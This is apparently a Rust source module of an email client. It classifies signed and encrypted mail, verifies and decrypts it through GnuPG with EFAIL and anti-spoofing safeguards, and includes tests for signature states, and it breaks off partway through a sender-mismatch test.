//! Reading signed and encrypted mail (ADR-0011 §2 and §3, MAIL-172 to MAIL-184).
//!
//! `classify` looks at the raw `.eml` and says what the top level is: PGP/MIME or S/MIME signed or encrypted,
//! inline OpenPGP, or plain. `process` then asks GnuPG (in a job: see `gpg.rs`) and builds a [`Security`]: the
//! facts for the status strip, taken from GnuPG's status lines only, and the message to show when the content
//! is not the outer mail (a decrypted one).
//!
//! Rules that keep it honest (EFAIL and spoofing):
//!
//! - Only a **top-level** encrypted entity is ever decrypted. An encrypted part next to other parts is not touched.
//! - A decrypted entity is shown **as its own message**: the outer headers, then the decrypted entity and nothing
//!   from the outer body.
//! - Signatures are verified over the **exact raw bytes** of the signed part, with line ends made CRLF.
//! - Nothing in the mail is ever turned into a status: [`Security`] is built from `Status` lines only.

use crate::config::CryptoStandard;
use crate::gpg::{Gnupg, GpgError, SigState, SigStatus, Trust};
use crate::mail;
use serde::{Deserialize, Serialize};
use std::sync::atomic::AtomicBool;

/// How many layers (signed, encrypted, signed…) are looked into.
const MAX_DEPTH: usize = 3;

// ---------------------------------------------------------------- raw pieces of a message

/// A message or MIME entity cut into its header lines and body, as bytes.
pub struct RawEntity<'a> {
    /// `(lower-case name, the header's lines as they are, folded lines included, without the final line end)`
    pub headers: Vec<(String, &'a [u8])>,
    pub body: &'a [u8],
}

/// Cut at the first empty line. A line ending is CRLF or LF.
pub fn split_raw(raw: &[u8]) -> RawEntity<'_> {
    let mut headers: Vec<(String, &[u8])> = Vec::new();
    let mut i = 0;
    let mut cur: Option<(usize, usize)> = None; // start and end of the header being collected
    let mut body_start = raw.len();
    while i < raw.len() {
        let end = raw[i..].iter().position(|&c| c == b'\n').map(|p| i + p).unwrap_or(raw.len());
        let line = raw[i..end].strip_suffix(b"\r").unwrap_or(&raw[i..end]);
        let next = (end + 1).min(raw.len());
        if line.is_empty() {
            body_start = next;
            break;
        }
        if (line[0] == b' ' || line[0] == b'\t') && cur.is_some() {
            if let Some(c) = cur.as_mut() {
                c.1 = i + line.len();
            }
        } else {
            if let Some((s, e)) = cur.take() {
                push_header(&mut headers, &raw[s..e]);
            }
            cur = Some((i, i + line.len()));
        }
        i = next;
        if i >= raw.len() {
            body_start = raw.len();
        }
    }
    if let Some((s, e)) = cur.take() {
        push_header(&mut headers, &raw[s..e]);
    }
    RawEntity { headers, body: &raw[body_start.min(raw.len())..] }
}

fn push_header<'a>(out: &mut Vec<(String, &'a [u8])>, bytes: &'a [u8]) {
    if let Some(colon) = bytes.iter().position(|&b| b == b':') {
        let name = String::from_utf8_lossy(&bytes[..colon]).trim().to_ascii_lowercase();
        if !name.is_empty() {
            out.push((name, bytes));
        }
    }
}

impl RawEntity<'_> {
    /// The unfolded value of a header (still with encoded words).
    pub fn value(&self, name: &str) -> Option<String> {
        self.headers.iter().find(|(n, _)| n == name).map(|(_, b)| {
            let text = String::from_utf8_lossy(b);
            let v = text.split_once(':').map(|x| x.1).unwrap_or("");
            v.split(['\r', '\n']).map(str::trim).filter(|l| !l.is_empty()).collect::<Vec<_>>().join(" ")
        })
    }
}

/// Bare line feeds become CRLF: the form in which a signature was made.
pub fn canonical_crlf(data: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(data.len() + data.len() / 40);
    let mut prev = 0u8;
    for &b in data {
        if b == b'\n' && prev != b'\r' {
            out.push(b'\r');
        }
        out.push(b);
        prev = b;
    }
    out
}

/// `Content-Type` of an entity: the lower-case type and its parameters.
fn content_type(e: &RawEntity<'_>) -> (String, Vec<(String, String)>) {
    let (t, p) = mail::parse_params(e.value("content-type").as_deref().unwrap_or("text/plain"));
    (if t.is_empty() { "text/plain".into() } else { t }, p)
}

/// The parts of a multipart entity, each as raw bytes (headers and body, without the line break before the boundary).
fn parts_of<'a>(e: &RawEntity<'a>, params: &[(String, String)]) -> Vec<&'a [u8]> {
    match mail::param(params, "boundary") {
        Some(b) if !b.is_empty() => mail::split_multipart(e.body, b),
        _ => vec![],
    }
}

// ---------------------------------------------------------------- what the top level is

/// How far a signature reaches.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub enum Scope {
    /// The whole mail.
    Whole,
    /// A part of the mail only.
    Part,
    /// A block of text inside the body (inline OpenPGP): weaker.
    Inline,
}

/// What the top level of a message is.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Structure {
    Plain,
    /// `multipart/signed`: the exact signed part (CRLF) and the signature bytes.
    Signed {
        standard: CryptoStandard,
        signed: Vec<u8>,
        signature: Vec<u8>,
        scope: Scope,
    },
    /// PGP/MIME or S/MIME enveloped: the data for `gpg --decrypt` / `gpgsm --decrypt`.
    Encrypted {
        standard: CryptoStandard,
        data: Vec<u8>,
    },
    /// S/MIME `signed-data`: the content is inside.
    OpaqueSigned {
        data: Vec<u8>,
    },
    /// A text that is one clear-signed OpenPGP block (and whether there is other text around it).
    InlineSigned {
        block: Vec<u8>,
        outside_text: bool,
    },
    /// A text that is one OpenPGP message and nothing else.
    InlineEncrypted {
        block: Vec<u8>,
    },
    /// Encrypted content next to other content, or an unusable structure: not decrypted, and why.
    Mixed {
        why: String,
    },
}

const PGP_SIGNED: &str = "-----BEGIN PGP SIGNED MESSAGE-----";
const PGP_SIG_END: &str = "-----END PGP SIGNATURE-----";
const PGP_MSG: &str = "-----BEGIN PGP MESSAGE-----";
const PGP_MSG_END: &str = "-----END PGP MESSAGE-----";

/// Look at the top level of a raw message (MAIL-172). No GnuPG call is made.
pub fn classify(raw: &[u8]) -> Structure {
    classify_entity(raw, 0)
}

fn classify_entity(raw: &[u8], depth: usize) -> Structure {
    let e = split_raw(raw);
    let (ctype, params) = content_type(&e);
    let protocol = mail::param(&params, "protocol").unwrap_or("").to_ascii_lowercase();
    match ctype.as_str() {
        "multipart/signed" => {
            let standard = match protocol.as_str() {
                "application/pgp-signature" => CryptoStandard::OpenPgp,
                "application/pkcs7-signature" | "application/x-pkcs7-signature" => CryptoStandard::Smime,
                _ => return Structure::Plain,
            };
            let parts = parts_of(&e, &params);
            if parts.len() != 2 {
                return Structure::Mixed { why: "A signed mail whose structure is not valid (it must have exactly two parts): the signature is not checked.".into() };
            }
            let sig = split_raw(parts[1]);
            let (sig_type, _) = content_type(&sig);
            let wanted = if standard == CryptoStandard::OpenPgp { "application/pgp-signature" } else { "application/pkcs7-signature" };
            if sig_type != wanted && !(standard == CryptoStandard::Smime && sig_type == "application/x-pkcs7-signature") {
                return Structure::Mixed { why: "A signed mail whose second part is not a signature: it is not checked.".into() };
            }
            let signature = mail::transfer_decode(sig.body, sig.value("content-transfer-encoding").as_deref().unwrap_or("7bit"));
            Structure::Signed { standard, signed: canonical_crlf(parts[0]), signature, scope: Scope::Whole }
        }
        "multipart/encrypted" => {
            if protocol != "application/pgp-encrypted" {
                return Structure::Mixed { why: "An encrypted mail of a kind Shale does not know.".into() };
            }
            let parts = parts_of(&e, &params);
            if parts.len() != 2 {
                return Structure::Mixed { why: "An encrypted mail whose structure is not valid (it must have exactly two parts): it is not decrypted.".into() };
            }
            let data = split_raw(parts[1]);
            let bytes = mail::transfer_decode(data.body, data.value("content-transfer-encoding").as_deref().unwrap_or("7bit"));
            Structure::Encrypted { standard: CryptoStandard::OpenPgp, data: bytes }
        }
        "application/pkcs7-mime" | "application/x-pkcs7-mime" => {
            let bytes = mail::transfer_decode(e.body, e.value("content-transfer-encoding").as_deref().unwrap_or("base64"));
            match mail::param(&params, "smime-type").map(|s| s.to_ascii_lowercase()).as_deref() {
                Some("signed-data") => Structure::OpaqueSigned { data: bytes },
                None | Some("enveloped-data") => Structure::Encrypted { standard: CryptoStandard::Smime, data: bytes },
                Some(other) => Structure::Mixed { why: format!("An S/MIME message of the kind “{other}”, which Shale does not read.") },
            }
        }
        t if t.starts_with("multipart/") => {
            if depth >= MAX_DEPTH {
                return Structure::Plain;
            }
            // look for signed or encrypted parts that are only a part of the mail
            let mut found: Option<Structure> = None;
            for p in parts_of(&e, &params) {
                match classify_entity(p, depth + 1) {
                    Structure::Plain => {}
                    Structure::Signed { standard, signed, signature, .. } => {
                        found.get_or_insert(Structure::Signed { standard, signed, signature, scope: Scope::Part });
                    }
                    Structure::Mixed { why } => {
                        found = Some(Structure::Mixed { why });
                        break;
                    }
                    Structure::Encrypted { .. } | Structure::OpaqueSigned { .. } | Structure::InlineEncrypted { .. } => {
                        found = Some(Structure::Mixed { why: "This mail mixes encrypted and unencrypted parts. It is not decrypted: showing decrypted text together with other parts of the mail could leak it.".into() });
                        break;
                    }
                    Structure::InlineSigned { .. } => {}
                }
            }
            found.unwrap_or(Structure::Plain)
        }
        "text/plain" => classify_inline(&e, &params),
        _ => Structure::Plain,
    }
}

fn classify_inline(e: &RawEntity<'_>, params: &[(String, String)]) -> Structure {
    let bytes = mail::transfer_decode(e.body, e.value("content-transfer-encoding").as_deref().unwrap_or("7bit"));
    let text = mail::decode_charset(&bytes, mail::param(params, "charset").unwrap_or("utf-8")).replace("\r\n", "\n");
    if text.contains(PGP_MSG) {
        let t = text.trim();
        let whole = t.starts_with(PGP_MSG) && t.ends_with(PGP_MSG_END) && t.matches(PGP_MSG).count() == 1;
        if whole {
            return Structure::InlineEncrypted { block: t.as_bytes().to_vec() };
        }
        return Structure::Mixed { why: "This mail has an encrypted block with other text around it. It is not decrypted: showing decrypted text together with unencrypted text could leak it.".into() };
    }
    if let (Some(s), Some(en)) = (text.find(PGP_SIGNED), text.find(PGP_SIG_END)) {
        if s < en {
            let end = en + PGP_SIG_END.len();
            let outside = !(text[..s].trim().is_empty() && text[end..].trim().is_empty());
            return Structure::InlineSigned { block: text.as_bytes()[s..end].to_vec(), outside_text: outside };
        }
    }
    Structure::Plain
}

// ---------------------------------------------------------------- what the person is told

/// One signature in the status strip: GnuPG's verdict and what was worked out from it.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct SigLine {
    pub standard: CryptoStandard,
    pub sig: SigStatus,
    pub scope: Scope,
    /// Does an address of the signer's key or certificate equal the From address? (None: not known)
    pub from_ok: Option<bool>,
}

/// What is known about the encryption of the open mail.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub enum Encryption {
    /// Not encrypted.
    Not,
    /// Encrypted, and the person has not agreed to decrypted local storage: nothing was decrypted.
    NeedsConsent,
    /// Decrypted now (and stored, because the consent is given).
    Decrypted(CryptoStandard),
    /// Decrypted before: this is the copy on this device, with the result that was found then (a time).
    DecryptedEarlier(CryptoStandard, i64),
    /// Decryption was tried and failed (the words).
    Failed(String),
    /// Encrypted content that is deliberately not decrypted (the words).
    NotDecrypted(String),
}

/// Everything the status strip shows. Built from GnuPG's status lines only.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct Security {
    pub lines: Vec<SigLine>,
    pub encryption: Encryption,
    /// Things worth saying that are not a verdict (an inline signature is weaker, the signature could not be checked…).
    pub notes: Vec<String>,
    /// Set while a job runs: what it is doing.
    #[serde(skip)]
    pub working: Option<String>,
    /// GnuPG is not installed (the words).
    #[serde(skip)]
    pub unavailable: Option<String>,
    /// When the verdicts were made.
    pub checked: i64,
}

impl Security {
    pub fn new() -> Security {
        Security { lines: vec![], encryption: Encryption::Not, notes: vec![], working: None, unavailable: None, checked: 0 }
    }
    /// Is there anything to show above the mail?
    pub fn is_empty(&self) -> bool {
        self.lines.is_empty() && self.encryption == Encryption::Not && self.notes.is_empty() && self.working.is_none() && self.unavailable.is_none()
    }
}

impl Default for Security {
    fn default() -> Self {
        Security::new()
    }
}

/// How serious a line of the strip is (its colour).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Level {
    Good,
    Warn,
    Bad,
    Info,
}

fn short_fpr(fp: &str) -> String {
    let t = fp.to_ascii_uppercase();
    let tail = if t.len() > 16 { &t[t.len() - 16..] } else { &t[..] };
    tail.as_bytes().chunks(4).map(|c| String::from_utf8_lossy(c).into_owned()).collect::<Vec<_>>().join(" ")
}

impl SigLine {
    /// The words and the colour for this signature.
    pub fn describe(&self) -> (Level, String) {
        let s = &self.sig;
        let who = if s.signer.is_empty() { format!("key {}", short_fpr(&s.fingerprint)) } else { s.signer.clone() };
        let fp = short_fpr(&s.fingerprint);
        let std = self.standard.label();
        let scope = match self.scope {
            Scope::Whole => "",
            Scope::Part => "Only a part of this mail is signed (the rest is not): ",
            Scope::Inline => "Inline signature, weaker (only the signed block is covered, not the rest of the mail): ",
        };
        let trust = match s.trust {
            Trust::Ultimate => "your own key",
            Trust::Full => "trusted",
            Trust::Marginal => "marginally trusted",
            Trust::Never => "marked as not trusted",
            Trust::Undefined | Trust::Unknown => "you have not certified this key",
        };
        let (mut level, mut text) = match s.state {
            SigState::Good => {
                let l = if matches!(s.trust, Trust::Full | Trust::Ultimate) { Level::Good } else { Level::Warn };
                (l, format!("{std} signature is valid: {who} (key {fp}); {trust}."))
            }
            SigState::Bad => (Level::Bad, format!("BAD {std} signature: the mail was changed after it was signed, or it is forged (claimed signer: {who}).")),
            SigState::UnknownKey if s.fingerprint.is_empty() => (Level::Warn, format!("Signed with a {std} certificate that is not in your keyring, so the signature cannot be checked. Import the certificate to check it.")),
            SigState::UnknownKey => (Level::Warn, format!("Signed with {std} key {fp}, which is not in your keyring, so the signature cannot be checked. Import the key to check it.")),
            SigState::ExpiredKey => (Level::Warn, format!("{std} signature is valid, but the signing key has expired: {who} (key {fp}).")),
            SigState::ExpiredSig => (Level::Warn, format!("{std} signature is valid, but the signature itself has expired: {who} (key {fp}).")),
            SigState::RevokedKey => (Level::Bad, format!("{std} signature from a REVOKED key: {who} (key {fp}). Do not trust it.")),
            SigState::Error => (Level::Warn, format!("The {std} signature could not be checked (key {fp}).")),
        };
        if self.from_ok == Some(false) && matches!(s.state, SigState::Good | SigState::ExpiredKey | SigState::ExpiredSig) {
            if level == Level::Good {
                level = Level::Warn;
            }
            text.push_str(" The signer's address is not the sender's (From) address.");
        }
        if self.scope != Scope::Whole && level == Level::Good {
            level = Level::Warn;
        }
        (level, format!("{scope}{text}"))
    }
}

impl Security {
    /// The lines of the strip, in order.
    pub fn describe(&self) -> Vec<(Level, String)> {
        let mut out = Vec::new();
        if let Some(w) = &self.working {
            out.push((Level::Info, w.clone()));
        }
        if let Some(u) = &self.unavailable {
            out.push((Level::Warn, u.clone()));
        }
        match &self.encryption {
            Encryption::Not => {}
            Encryption::NeedsConsent => out.push((Level::Warn, "Encrypted — enable encryption in the settings".to_string())),
            Encryption::Decrypted(s) => out.push((Level::Info, format!("Encrypted ({}). Decrypted; a decrypted copy is stored on this computer.", s.label()))),
            Encryption::DecryptedEarlier(s, t) => out.push((Level::Info, format!("Encrypted ({}). This is the decrypted copy stored on this computer ({}); the signature result is from then.", s.label(), crate::mail_ui::full_date(*t)))),
            Encryption::Failed(e) => out.push((Level::Bad, e.clone())),
            Encryption::NotDecrypted(e) => out.push((Level::Warn, e.clone())),
        }
        for l in &self.lines {
            out.push(l.describe());
        }
        for n in &self.notes {
            out.push((Level::Info, n.clone()));
        }
        out
    }
}

// ---------------------------------------------------------------- the job

/// What `process` makes of a message.
pub struct Outcome {
    pub security: Security,
    /// The message to show instead of the stored one (the decrypted one, or the signed content without its signature part).
    pub display: Option<Vec<u8>>,
    /// The display message is a decrypted one that is to be stored next to the original (only with the consent).
    pub decrypted: bool,
}

struct Ctx<'a> {
    g: &'a Gnupg,
    consent: bool,
    cancel: &'a AtomicBool,
    from_addr: Option<String>,
}

fn gpg_words(e: &GpgError) -> String {
    e.to_string()
}

/// Run GnuPG over a message and say what is the case (MAIL-173 to MAIL-177, MAIL-181, MAIL-182). Never panics on any
/// input; every failure is in the returned [`Security`].
pub fn process(g: &Gnupg, raw: &[u8], consent: bool, cancel: &AtomicBool, now: i64) -> Outcome {
    let e = split_raw(raw);
    let from = e.value("from").map(|f| mail::decode_words(&f)).and_then(|f| crate::gpg::address_in(&f));
    let ctx = Ctx { g, consent, cancel, from_addr: from };
    let mut sec = Security::new();
    sec.checked = now;
    let mut decrypted = false;
    let shown = analyze(&ctx, raw, 0, &mut sec, &mut decrypted);
    let display = shown.map(|entity| synthesize(raw, &entity));
    Outcome { security: sec, display, decrypted }
}

fn record_error(sec: &mut Security, e: &GpgError) {
    match e {
        GpgError::Missing(_) => sec.unavailable = Some(gpg_words(e)),
        other => sec.notes.push(gpg_words(other)),
    }
}

/// Add the verdicts of a verification.
fn add_signatures(ctx: &Ctx<'_>, sec: &mut Security, standard: CryptoStandard, sigs: Vec<SigStatus>, scope: Scope) {
    for sig in sigs {
        let from_ok = match (&ctx.from_addr, sig.state) {
            (Some(from), SigState::Good | SigState::ExpiredKey | SigState::ExpiredSig) if crate::gpg::is_key_id(&sig.fingerprint) => match ctx.g.key_info(standard, &sig.fingerprint, ctx.cancel) {
                Ok(Some(k)) if !k.emails.is_empty() => Some(k.emails.iter().any(|a| a.eq_ignore_ascii_case(from))),
                _ => None,
            },
            _ => None,
        };
        sec.lines.push(SigLine { standard, sig, scope, from_ok });
    }
}

/// Look at one entity; returns the entity to show when it is not the one given. `top` entities are the mail itself.
fn analyze(ctx: &Ctx<'_>, entity: &[u8], depth: usize, sec: &mut Security, decrypted: &mut bool) -> Option<Vec<u8>> {
    if depth > MAX_DEPTH {
        return None;
    }
    match classify_entity(entity, 0) {
        Structure::Plain => None,
        Structure::Mixed { why } => {
            if why.contains("encrypted") {
                sec.encryption = Encryption::NotDecrypted(why);
            } else {
                sec.notes.push(why);
            }
            None
        }
        Structure::Signed { standard, signed, signature, scope } => {
            match ctx.g.verify_detached(standard, &signature, &signed, ctx.cancel) {
                Ok(sigs) if sigs.is_empty() => sec.notes.push(format!("The {} signature could not be read, so it is not checked.", standard.label())),
                Ok(sigs) => add_signatures(ctx, sec, standard, sigs, scope),
                Err(e) => record_error(sec, &e),
            }
            if scope == Scope::Part {
                return None;
            }
            // encrypt-then-sign: the signed entity may itself be the encrypted one
            let inner = analyze(ctx, &signed, depth + 1, sec, decrypted);
            Some(inner.unwrap_or(signed))
        }
        Structure::Encrypted { standard, data } => {
            if !ctx.consent {
                sec.encryption = Encryption::NeedsConsent;
                return None;
            }
            match ctx.g.decrypt(standard, &data, ctx.cancel) {
                Err(e) => {
                    sec.encryption = Encryption::Failed(gpg_words(&e));
                    if let GpgError::Missing(_) = e {
                        sec.unavailable = Some(gpg_words(&e));
                    }
                    None
                }
                Ok(Err(f)) => {
                    sec.encryption = Encryption::Failed(f.to_string());
                    None
                }
                Ok(Ok(d)) => {
                    sec.encryption = Encryption::Decrypted(standard);
                    *decrypted = true;
                    add_signatures(ctx, sec, standard, d.signatures, Scope::Whole);
                    let plain = ensure_entity(&d.plain);
                    // sign-then-encrypt: the decrypted entity may be signed again
                    let inner = analyze(ctx, &plain, depth + 1, sec, decrypted);
                    Some(inner.unwrap_or(plain))
                }
            }
        }
        Structure::OpaqueSigned { data } => match ctx.g.extract_signed(CryptoStandard::Smime, &data, ctx.cancel) {
            Err(e) => {
                record_error(sec, &e);
                None
            }
            Ok(None) => {
                sec.notes.push("This S/MIME message could not be read as a signed message, so it is not shown.".into());
                None
            }
            Ok(Some((content, sigs))) => {
                add_signatures(ctx, sec, CryptoStandard::Smime, sigs, Scope::Whole);
                let plain = ensure_entity(&content);
                let inner = analyze(ctx, &plain, depth + 1, sec, decrypted);
                Some(inner.unwrap_or(plain))
            }
        },
        Structure::InlineSigned { block, outside_text } => {
            match ctx.g.verify_inline(CryptoStandard::OpenPgp, &block, ctx.cancel) {
                Ok(sigs) => add_signatures(ctx, sec, CryptoStandard::OpenPgp, sigs, Scope::Inline),
                Err(e) => record_error(sec, &e),
            }
            if outside_text {
                sec.notes.push("There is text outside the signed block; it is not covered by the signature.".into());
            }
            None
        }
        Structure::InlineEncrypted { block } => {
            if !ctx.consent {
                sec.encryption = Encryption::NeedsConsent;
                return None;
            }
            match ctx.g.decrypt(CryptoStandard::OpenPgp, &block, ctx.cancel) {
                Err(e) => {
                    sec.encryption = Encryption::Failed(gpg_words(&e));
                    None
                }
                Ok(Err(f)) => {
                    sec.encryption = Encryption::Failed(f.to_string());
                    None
                }
                Ok(Ok(d)) => {
                    sec.encryption = Encryption::Decrypted(CryptoStandard::OpenPgp);
                    *decrypted = true;
                    sec.notes.push("Inline OpenPGP (not PGP/MIME): weaker, nothing proves what else the mail contained.".into());
                    add_signatures(ctx, sec, CryptoStandard::OpenPgp, d.signatures, Scope::Inline);
                    let mut e = b"Content-Type: text/plain; charset=utf-8\r\nContent-Transfer-Encoding: 8bit\r\n\r\n".to_vec();
                    e.extend_from_slice(&d.plain);
                    Some(e)
                }
            }
        }
    }
}

/// Decrypted data is a MIME entity (headers, empty line, body). If it does not start like one it is text.
fn ensure_entity(data: &[u8]) -> Vec<u8> {
    let first = data.split(|&b| b == b'\n').next().unwrap_or(b"");
    let looks_like_header = first.iter().position(|&b| b == b':').is_some_and(|c| c > 0 && first[..c].iter().all(|&b| b.is_ascii_graphic() && b != b':'));
    if looks_like_header || data.starts_with(b"\r\n") || data.starts_with(b"\n") {
        data.to_vec()
    } else {
        let mut e = b"Content-Type: text/plain; charset=utf-8\r\nContent-Transfer-Encoding: 8bit\r\n\r\n".to_vec();
        e.extend_from_slice(data);
        e
    }
}

/// The message to show for a mail whose content is `entity`: the outer message's headers (without its MIME headers),
/// then the entity. The outer body is not part of it.
pub fn synthesize(outer: &[u8], entity: &[u8]) -> Vec<u8> {
    const MIME_HEADERS: [&str; 5] = ["content-type", "content-transfer-encoding", "content-disposition", "content-description", "mime-version"];
    let e = split_raw(outer);
    let mut out = Vec::with_capacity(entity.len() + 512);
    for (name, bytes) in &e.headers {
        if MIME_HEADERS.contains(&name.as_str()) {
            continue;
        }
        out.extend_from_slice(bytes);
        out.extend_from_slice(b"\r\n");
    }
    out.extend_from_slice(b"MIME-Version: 1.0\r\n");
    out.extend_from_slice(entity);
    out
}

/// Mails made with the real GnuPG programs, for the tests of this module and of the mail view.
#[cfg(test)]
pub(crate) mod testmail {
    use crate::gpg::testkit::TestHome;

    pub const OUTER: &str = "From: Alice Test <alice@example.org>\r\nTo: Bob <bob@example.org>\r\nSubject: Plans\r\nDate: Sat, 14 Nov 2026 10:00:00 +0000\r\nMessage-ID: <t1@example.org>\r\nMIME-Version: 1.0\r\n";
    pub const ENTITY: &[u8] = b"Content-Type: text/plain; charset=utf-8\r\n\r\nthe secret plan\r\n";

    pub fn mail_of(content_type_and_body: &str) -> Vec<u8> {
        format!("{OUTER}{content_type_and_body}").into_bytes()
    }

    /// A PGP/MIME signed mail made by `gpg` over exactly `entity`.
    pub fn pgp_signed(h: &TestHome, fpr: &str, entity: &[u8]) -> Vec<u8> {
        let sig = h.pgp_sign(fpr, entity, None);
        let mut m = mail_of("Content-Type: multipart/signed; micalg=pgp-sha256; protocol=\"application/pgp-signature\"; boundary=\"SB\"\r\n\r\n--SB\r\n");
        m.extend_from_slice(entity);
        m.extend_from_slice(b"\r\n--SB\r\nContent-Type: application/pgp-signature; name=\"signature.asc\"\r\n\r\n");
        m.extend_from_slice(&sig);
        m.extend_from_slice(b"\r\n--SB--\r\n");
        m
    }

    pub fn pgp_encrypted(armored: &[u8]) -> Vec<u8> {
        // armor made by gpg has LF line ends; in a mail it is CRLF like everything else
        let armored = String::from_utf8_lossy(armored).replace("\r\n", "\n").replace('\n', "\r\n").into_bytes();
        let armored = &armored[..];
        let mut m = mail_of("Content-Type: multipart/encrypted; protocol=\"application/pgp-encrypted\"; boundary=\"EB\"\r\n\r\n--EB\r\nContent-Type: application/pgp-encrypted\r\n\r\nVersion: 1\r\n\r\n--EB\r\nContent-Type: application/octet-stream; name=\"encrypted.asc\"\r\n\r\n");
        m.extend_from_slice(armored);
        m.extend_from_slice(b"\r\n--EB--\r\n");
        m
    }

    pub fn b64_lines(data: &[u8]) -> String {
        let t = crate::imap_client::base64_encode(data);
        t.as_bytes().chunks(76).map(|c| String::from_utf8_lossy(c).into_owned()).collect::<Vec<_>>().join("\r\n")
    }

    pub fn smime_signed(sig_der: &[u8], entity: &[u8]) -> Vec<u8> {
        let mut m = mail_of("Content-Type: multipart/signed; micalg=sha-256; protocol=\"application/pkcs7-signature\"; boundary=\"MB\"\r\n\r\n--MB\r\n");
        m.extend_from_slice(entity);
        m.extend_from_slice(format!("\r\n--MB\r\nContent-Type: application/pkcs7-signature; name=smime.p7s\r\nContent-Transfer-Encoding: base64\r\n\r\n{}\r\n--MB--\r\n", b64_lines(sig_der)).as_bytes());
        m
    }

    pub fn smime_enveloped(der: &[u8]) -> Vec<u8> {
        mail_of(&format!("Content-Type: application/pkcs7-mime; smime-type=enveloped-data; name=smime.p7m\r\nContent-Transfer-Encoding: base64\r\n\r\n{}\r\n", b64_lines(der)))
    }
}

// ---------------------------------------------------------------- tests

#[cfg(test)]
mod tests {
    use super::*;

    fn signed_mail(protocol: &str, sig_type: &str, sig: &str) -> Vec<u8> {
        format!(
            "From: a@x.org\r\nTo: b@x.org\r\nSubject: s\r\nMIME-Version: 1.0\r\nContent-Type: multipart/signed; micalg=pgp-sha256; protocol=\"{protocol}\"; boundary=\"B\"\r\n\r\n--B\r\nContent-Type: text/plain\r\n\r\nhello\r\n--B\r\nContent-Type: {sig_type}\r\n\r\n{sig}\r\n--B--\r\n"
        )
        .into_bytes()
    }

    // ---- with real GnuPG (a temp home; the producers are the gpg programs themselves) ----

    use super::testmail::*;
    use crate::gpg::testkit::{have_gnupg, no_cancel, TestHome};
    const NOW: i64 = 1_794_657_600;

    fn run(g: &Gnupg, raw: &[u8], consent: bool) -> Outcome {
        process(g, raw, consent, &no_cancel(), NOW)
    }

    fn only_line(o: &Outcome) -> &SigLine {
        assert_eq!(o.security.lines.len(), 1, "{:?}", o.security);
        &o.security.lines[0]
    }

    // spec: MAIL-173, MAIL-174, MAIL-197
    #[test]
    fn a_pgp_mime_signature_verifies_over_the_exact_bytes_and_one_changed_byte_makes_it_bad() {
        if !have_gnupg() {
            return;
        }
        let alice = TestHome::new();
        let a_fpr = alice.gen_pgp("Alice Test", "alice@example.org", "never", None);
        let bob = TestHome::new();
        alice.share_pgp_with(&bob, &a_fpr);
        let mail = pgp_signed(&alice, &a_fpr, ENTITY);
        // Bob has the key but has not certified it: valid, and told so
        let o = run(&bob.g, &mail, false);
        let l = only_line(&o);
        assert_eq!((l.standard, l.sig.state, l.scope, l.from_ok), (CryptoStandard::OpenPgp, SigState::Good, Scope::Whole, Some(true)));
        assert_eq!(l.sig.fingerprint, a_fpr);
        assert!(l.sig.signer.contains("Alice Test") && l.sig.trust <= Trust::Undefined, "{:?}", l.sig);
        let (level, words) = l.describe();
        assert_eq!(level, Level::Warn, "{words}");
        assert!(words.contains("valid") && words.contains("alice@example.org"), "{words}");
        // Alice's own keyring: ultimate trust, green
        let o = run(&alice.g, &mail, false);
        assert_eq!((only_line(&o).describe().0, only_line(&o).sig.trust), (Level::Good, Trust::Ultimate));
        assert!(o.display.as_ref().is_some_and(|d| mail::parse(d).text == "the secret plan"), "the signed content is shown without its signature part");
        assert!(!o.decrypted && o.security.encryption == Encryption::Not);
        // one changed byte: BAD
        let mut bad = mail.clone();
        let at = bad.windows(10).position(|w| w == b"the secret").unwrap();
        bad[at] = b'T';
        let o = run(&bob.g, &bad, false);
        assert_eq!((only_line(&o).sig.state, only_line(&o).describe().0), (SigState::Bad, Level::Bad));
        // the same bytes stored with bare line feeds still verify (canonical CRLF)
        let lf = String::from_utf8(mail.clone()).unwrap().replace("\r\n", "\n");
        assert_eq!(only_line(&run(&bob.g, lf.as_bytes(), false)).sig.state, SigState::Good);
    }

    // spec: MAIL-174, MAIL-197
    #[test]
    fn an_unknown_signer_an_expired_key_and_a_revoked_key_each_have_their_own_status() {
        if !have_gnupg() {
            return;
        }
        let alice = TestHome::new();
        let a_fpr = alice.gen_pgp("Alice Test", "alice@example.org", "never", None);
        let stranger = TestHome::new();
        let mail = pgp_signed(&alice, &a_fpr, ENTITY);
        let o = run(&stranger.g, &mail, false);
        assert_eq!((only_line(&o).sig.state, only_line(&o).describe().0), (SigState::UnknownKey, Level::Warn));
        assert!(only_line(&o).describe().1.contains("not in your keyring"));
        // expired: made in 2020 with a key that lived 30 days
        let old = TestHome::new();
        let o_fpr = old.gen_pgp("Old Key", "alice@example.org", "30d", Some("20200101T000000"));
        let sig = old.pgp_sign(&o_fpr, ENTITY, Some("20200110T000000"));
        let mut m = mail_of("Content-Type: multipart/signed; protocol=\"application/pgp-signature\"; boundary=\"SB\"\r\n\r\n--SB\r\n");
        m.extend_from_slice(ENTITY);
        m.extend_from_slice(b"\r\n--SB\r\nContent-Type: application/pgp-signature\r\n\r\n");
        m.extend_from_slice(&sig);
        m.extend_from_slice(b"\r\n--SB--\r\n");
        let o = run(&old.g, &m, false);
        assert_eq!((only_line(&o).sig.state, only_line(&o).describe().0), (SigState::ExpiredKey, Level::Warn), "{:?}", o.security);
        // revoked
        let rev = TestHome::new();
        let r_fpr = rev.gen_pgp("Rev Key", "alice@example.org", "never", None);
        let m = pgp_signed(&rev, &r_fpr, ENTITY);
        rev.revoke_pgp(&r_fpr);
        let o = run(&rev.g, &m, false);
        assert_eq!((only_line(&o).sig.state, only_line(&o).describe().0), (SigState::RevokedKey, Level::Bad), "{:?}", o.security);
    }

    // spec: MAIL-174
    #[test]
    fn a_valid_signature_by_somebody_else_than_the_sender_is_flagged() {
        if !have_gnupg() {
            return;
        }
        let mallory = TestHome::new();
        let m_fpr = mallory.gen_pgp("Mallory", "mallory@evil.example", "never", None);
        let bob = TestHome::new();
        mallory.share_pgp_with(&bob, &m_fpr);
        // the mail claims to be from alice but is signed by mallory
        let o = run(&bob.g, &pgp_signed(&mallory, &m_fpr, ENTITY), false);
        let l = only_line(&o);
